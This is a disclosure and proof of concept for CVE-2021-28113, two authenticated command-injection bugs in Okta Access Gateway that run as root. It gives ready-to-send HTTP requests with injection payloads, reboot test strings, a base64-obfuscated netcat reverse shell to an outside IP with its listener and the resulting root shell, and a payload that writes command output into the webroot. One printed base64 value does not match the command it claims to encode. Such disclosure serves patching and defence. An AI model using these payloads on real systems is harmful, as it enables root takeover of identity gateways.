    Okta Access Gateway v2020.5.5 Post-Auth Remote Root RCE

    CVE-2021-28113

    =======
    Details
    =======

    There are two command injection bugs can that be triggered after authenticating to the web UI.
    Since the injection occurs when a script is executed with sudo, the commands are ran with root
    privileges.

    BUG #1 - relay

    Command injection as root in Applications via the 'relaydomain' field when passing
    parameters to generateCert.sh. This is blind injection, so without monitoring logs or
    local execution instrumentation, the output will not simply returned in the response.

    Also, the included 'nc' binary that the system image includes has the -e flag available
    which enables an exploitation easier via connect back shell.

    [Request]

    POST /api/v1/app/idp/[valid-IDP] HTTP/1.1
    Host: gw-admin.domain.tld
    Content-Type: application/json;charset=utf-8
    X-CSRF-TOKEN: [placeholder]
    Content-Length: 134
    Cookie: CSRF-TOKEN=[placeholder]; JSESSIONID=[placeholder]; SessionCookie=[placeholder]

    {"settings":
    {"label":"test",
    "type":"CERTHEADER2015_APP",
    "relaydomain":"..$(whoami)", <-- HERE
    "groups":[],
    "handlers":{}}
    ,"policies":[{}]}

    [Response /w local instrumentation for monitoring]

    pid=23033 executed [/bin/bash /opt/oag/bin/generateCert.sh -w -d .root ]

    [Quick testing]

    "relaydomain":"..$(reboot)"

    and the system should reboot.

    [Exploitation for reverse shell]

    Note: for some bizzare reason, this payload worked for a period of time during testing, but was not generally reproducible afterwards.

    1) generate base64 for the connect back command to be executed

    $ echo -n "nc 10.0.0.111 5000 -e /bin/bash" | base64
    bmMgMTAuMTAuMTAuMTc5IDU1NTUgLWUgL2Jpbi9iYXNo

    2) start a listener

    $ nc -l -p 5000
    ...

    3) make the request with the payload (.. is required due to how it parses domains)

    ..$(echo${IFS}'bmMgMTAuMC4wLjExMSA1MDAwIC1lIC9iaW4vYmFzaA=='>test;$(base64${IFS}-d${IFS}test))

    4) get a root shell from the server

    * connection from 10.0.0.77 *
    python -c 'import pty; pty.spawn("/bin/bash")'

    [0] root@oag.okta.com;/root#

    BUG #2 - cookie

    Command injection as root in Identity Providers via the 'cookieDomain' field when passing
    parameters to generateCert.sh.

    [Request]

    POST /api/v1/setting/idp/local HTTP/1.1
    Host: gw-admin.domain.tld
    Content-Type: application/json;charset=utf-8
    X-CSRF-TOKEN: [placeholder]
    Content-Length: 222
    Cookie: CSRF-TOKEN=[placeholder]; JSESSIONID=[placeholder]; SessionCookie=[placeholder]

    {"subCategory":
    "IDP_SAML_LOCAL",
    "json":{
    "name":"Local OAG IDP",

    "cookieDomain":"$(uname${IFS}-n)", <-- HERE
    "nameIDFormat":"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified",
    "metadata":{}},
    "$edit":true}

    [Response /w local instrumentation for monitoring]

    pid=22822 executed [/bin/bash /opt/oag/bin/generateCert.sh -w -d Linux oag 3.10.0-957.27.2.el7.x86_64

    [Quick testing]

    "cookieDomain":"$(reboot)"

    and the system should reboot.

    [Exploitation for executing commands with output in the webroot]

    Same note as the previous one; for some reason, this payload worked for a period of time during testing, but then stopped fully working (the bug was still there just less exploitable).

    1) generate base64 for "ls -al /root" to be written to a location accessible via web request

    $ echo -n "script -q -c ls\$IFS-al\$IFS/root /opt/oag/simpleSAMLphp/www/test.php" | base64 -w0
    c2NyaXB0IC1xIC1jIGxzJElGUy1hbCRJRlMvcm9vdCAvb3B0L29hZy9zaW1wbGVTQU1McGhwL3d3dy90ZXN0LnBocA==

    2) make the request with the payload

    $(echo${IFS}'c2NyaXB0IC1xIC1jIGxzJElGUy1hbCRJRlMvcm9vdCAvb3B0L29hZy9zaW1wbGVTQU1McGhwL3d3dy90ZXN0LnBocA=='>test;$(base64${IFS}-d${IFS}test))

    3) check https://gw-admin.domain.tld/auth/test.php for the output of the command

    ===
    Fix
    ===

    The cookie bug was a "known issue" and fixed in v2020.9.3 and the relay bug was also fixed and no longer works on the latest v2021.2.1.
